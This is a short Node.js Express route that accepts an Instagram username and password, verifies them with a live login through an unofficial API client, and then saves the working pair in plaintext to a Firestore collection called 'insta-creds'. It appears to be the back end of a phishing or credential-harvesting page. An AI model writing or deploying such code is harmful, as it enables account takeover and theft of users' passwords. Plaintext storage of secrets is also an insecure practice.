const express = require("express");
const router = express.Router();
const { IgApiClient } = require("instagram-private-api");
const db = require("../firebaseConfig")
const { collection, addDoc } = require("firebase/firestore");

router.post("/loginVerify", async (req, res) => {
  try {
    const ig = new IgApiClient();
    const { USERNAME, PASSWORD } = req.body;
    ig.state.generateDevice(USERNAME);
    await ig.account.login(USERNAME, PASSWORD);
    const data = {
        USERNAME:USERNAME,
        PASSWORD:PASSWORD
    }
    await addDoc(collection(db, "insta-creds"),data);
    res.status(200).json({msg:"Success"})
  } catch (error) {
    console.log(error.message)
    res.status(401).json({msg:"Invalid Credentials Please Try again later"})
  }
});
module.exports = router;
